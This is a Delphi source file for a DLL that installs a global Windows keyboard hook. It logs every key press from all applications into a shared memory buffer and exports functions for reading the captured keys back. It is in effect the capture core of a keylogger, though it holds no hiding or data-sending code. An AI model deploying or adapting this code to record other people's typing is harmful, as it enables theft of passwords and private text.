unit U_HookDLL;

interface

uses
  Windows;

const BUFFER_SIZE = 16 * 1024;              //文件映射到内存的大小
const HOOK_MEM_FILENAME = 'MEM_FILE';       //映像文件名称
const HOOK_MUTEX_NAME = 'MUTEX_NAME';       //互斥名称

type
  //共享数据结构
  TShared = record
    Keys: array[0..BUFFER_SIZE - 1] of Char;
    KeyCount: Integer;
  end;
  //共享数据结构指针
  PShared = ^TShared;

var
  MemFile, HookMutex: THandle;              //文件句柄和互斥句柄
  hOldKeyHook: HHook;                       //钩子变量
  Shared: PShared;                          //共享变量

implementation

//键盘钩子回调函数
function KeyHookProc(iCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;
  stdcall; export;
const
  KeyPressMask = $80000000;
begin
  if iCode < 0 then
    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam)
  else
  begin
    if ((lParam and KeyPressMask) = 0) then
    begin
      //捕获键盘消息
      Shared^.Keys[Shared^.KeyCount] := Char(wParam and $00FF);
      Inc(Shared^.KeyCount);
      //达到缓冲区容量限制时重置
      if Shared^.KeyCount >= BUFFER_SIZE - 1 then
        Shared^.KeyCount := 0;
    end;
    Result := 0;
  end;
end;

//安装键盘钩子
function EnableKeyHook: BOOL; export;
begin
  Shared^.KeyCount := 0;

  if hOldKeyHook = 0 then
  begin
    //WH_KEYBOARD:键盘钩子, KeyHookProc:回调函数, HInstance:回调函数实例, 线程ID
    hOldKeyHook := SetWindowsHookEx(WH_KEYBOARD, KeyHookProc, HInstance, 0);
  end;

  Result := (hOldKeyHook <> 0);
end;

{卸载键盘钩子}
function DisableKeyHook: BOOL; export;
begin
  if hOldKeyHook <> 0 then
  begin
    UnHookWindowsHookEx(hOldKeyHook);
    hOldKeyHook := 0;
    Shared^.KeyCount := 0;
  end;

  Result := (hOldKeyHook = 0);
end;

//返回捕获的按键个数
function GetKeyCount: Integer; export;
begin
  Result := Shared^.KeyCount;
end;

//返回指定按键
function GetKey(Index: Integer): Char; export;
begin
  Result := Shared^.Keys[Index];
end;

//清空存放按键的缓冲区
procedure ClearKeyString; export;
begin
  Shared^.KeyCount := 0;
end;

//导出函数列表
exports
  EnableKeyHook,
  DisableKeyHook,
  GetKeyCount,
  ClearKeyString,
  GetKey;

initialization
  //创建互斥变量, 只允许一个进程使用此DLL
  HookMutex := CreateMutex(nil, True, HOOK_MUTEX_NAME);

  //打开文件映像
  MemFile := OpenFileMapping(FILE_MAP_WRITE, False, HOOK_MEM_FILENAME);

  //如果不存在该文件映像则重新创建
  if MemFile = 0 then
    MemFile := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0,
      SizeOf(TShared), HOOK_MEM_FILENAME);

  //文件映射内存
  Shared := MapViewOfFile(MemFile, File_MAP_WRITE, 0, 0, 0);

  //释放互斥变量
  ReleaseMutex(HookMutex);

  //关闭互斥句柄
  CloseHandle(HookMutex);

finalization
  //卸载键盘钩子
  if hOldKeyHook <> 0 then
    DisableKeyHook;

  //释放映射
  UnMapViewOfFile(Shared);

  //关闭映像文件句柄
  CloseHandle(MemFile);

end.